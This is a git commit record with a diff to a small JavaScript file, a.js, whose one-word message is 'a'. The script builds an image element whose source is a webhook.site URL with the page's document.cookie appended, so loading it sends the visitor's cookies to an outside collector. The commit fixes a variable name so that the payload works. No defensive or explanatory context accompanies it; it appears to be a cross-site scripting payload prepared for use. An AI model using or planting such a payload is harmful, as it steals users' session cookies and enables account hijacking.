df133b91a4248ac7c699752b9771fbcb1596578c
carloszavaleta <czavaleta93@gmail.com>
2020-01-20 23:17:54 -0600

    a

--- a.js
+++ a.js
@@ -1,5 +1,5 @@
 var image = document.createElement("img")
 
-img.src = "https://webhook.site/b81680db-bfa4-4145-bac6-b080d948562d/picture.png?c=" + document.cookie
+image.src = "https://webhook.site/b81680db-bfa4-4145-bac6-b080d948562d/picture.png?c=" + document.cookie
 
 document.body.appendChild(image);
